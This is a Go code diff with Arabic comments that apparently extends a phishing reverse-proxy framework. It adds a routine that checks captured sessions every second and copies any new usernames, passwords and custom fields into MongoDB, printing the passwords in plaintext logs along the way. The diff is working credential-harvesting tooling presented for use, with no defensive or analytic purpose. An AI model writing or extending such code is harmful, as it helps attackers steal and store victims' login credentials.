@@ -243,6 +243,9 @@ func main() {
 				syncSessionsToMongoDB(buntDb, db)
 			}
 		}()
+		
+		// إضافة اعتراض لدوال تحديث الجلسة في BuntDB لتحديث MongoDB مباشرة
+		go monitorSessionUpdates(buntDb, db)
 	}
 	
 	hp.Start()
@@ -385,5 +388,87 @@ func syncSessionsToMongoDB(buntDb *database.Database, mongoDb database.IDatabase
 	
 	if success > 0 {
 		log.Info("اكتملت المزامنة: تمت مزامنة %d من %d جلسة بنجاح", success, len(sessions))
+	}
+}
+
+// monitorSessionUpdates يراقب تحديثات الجلسات في BuntDB ويحدث MongoDB مباشرة
+func monitorSessionUpdates(buntDb *database.Database, mongoDb database.IDatabase) {
+	log.Debug("بدء مراقبة تحديثات الجلسات...")
+	
+	ticker := time.NewTicker(1 * time.Second)
+	defer ticker.Stop()
+	
+	var lastSessions []*database.Session
+	
+	for range ticker.C {
+		// الحصول على قائمة الجلسات الحالية
+		sessions, err := buntDb.ListSessions()
+		if err != nil {
+			log.Error("فشل الحصول على قائمة الجلسات: %v", err)
+			continue
+		}
+		
+		// إذا كانت هذه هي المرة الأولى، نحفظ القائمة ونستمر
+		if lastSessions == nil {
+			lastSessions = sessions
+			continue
+		}
+		
+		// البحث عن الجلسات المحدثة
+		for _, current := range sessions {
+			// البحث عن الجلسة السابقة
+			var previous *database.Session
+			for _, s := range lastSessions {
+				if s.SessionId == current.SessionId {
+					previous = s
+					break
+				}
+			}
+			
+			// إذا لم نجد الجلسة السابقة، فهي جلسة جديدة
+			if previous == nil {
+				log.Debug("تم اكتشاف جلسة جديدة: %s", current.SessionId)
+				continue
+			}
+			
+			// التحقق من تحديث اسم المستخدم
+			if current.Username != previous.Username && current.Username != "" {
+				log.Debug("تم اكتشاف تحديث اسم المستخدم: %s -> %s", previous.Username, current.Username)
+				err = mongoDb.SetSessionUsername(current.SessionId, current.Username)
+				if err != nil {
+					log.Error("فشل تحديث اسم المستخدم في MongoDB: %v", err)
+				} else {
+					log.Success("تم تحديث اسم المستخدم في MongoDB: %s", current.Username)
+				}
+			}
+			
+			// التحقق من تحديث كلمة المرور
+			if current.Password != previous.Password && current.Password != "" {
+				log.Debug("تم اكتشاف تحديث كلمة المرور: %s -> %s", previous.Password, current.Password)
+				err = mongoDb.SetSessionPassword(current.SessionId, current.Password)
+				if err != nil {
+					log.Error("فشل تحديث كلمة المرور في MongoDB: %v", err)
+				} else {
+					log.Success("تم تحديث كلمة المرور في MongoDB: %s", current.Password)
+				}
+			}
+			
+			// التحقق من تحديث البيانات المخصصة
+			for key, value := range current.Custom {
+				prevValue, exists := previous.Custom[key]
+				if !exists || value != prevValue {
+					log.Debug("تم اكتشاف تحديث بيانات مخصصة: %s -> %s", key, value)
+					err = mongoDb.SetSessionCustom(current.SessionId, key, value)
+					if err != nil {
+						log.Error("فشل تحديث البيانات المخصصة في MongoDB: %v", err)
+					} else {
+						log.Success("تم تحديث البيانات المخصصة في MongoDB: %s = %s", key, value)
+					}
+				}
+			}
+		}
+		
+		// تحديث القائمة السابقة
+		lastSessions = sessions
 	}
 }
